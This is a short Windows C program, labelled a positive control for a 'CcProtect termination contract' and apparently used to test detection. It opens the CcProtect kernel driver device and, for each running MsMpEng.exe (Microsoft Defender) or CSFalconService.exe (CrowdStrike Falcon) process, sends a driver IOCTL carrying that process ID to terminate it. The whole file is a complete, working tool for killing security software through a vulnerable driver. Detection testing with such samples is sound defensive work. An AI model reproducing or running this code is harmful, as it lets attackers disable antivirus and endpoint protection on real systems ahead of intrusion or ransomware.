// Representative positive control for the retained CcProtect termination contract.
#include <windows.h>
#include <tlhelp32.h>
int wmain() {
    HANDLE device = CreateFileW(L"\\\\.\\CcProtect", GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) return 1;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry = { sizeof(entry) };
    if (Process32FirstW(snapshot, &entry)) do {
        if (_wcsicmp(entry.szExeFile, L"MsMpEng.exe") == 0 ||
            _wcsicmp(entry.szExeFile, L"CSFalconService.exe") == 0) {
            struct { DWORD pid; DWORD status; } request = {entry.th32ProcessID, 0};
            DWORD returned;
            DeviceIoControl(device, 0x222024, &request, sizeof(request),
                NULL, 0, &returned, NULL);
        }
    } while (Process32NextW(snapshot, &entry));
    CloseHandle(snapshot);
    CloseHandle(device);
    return 0;
}
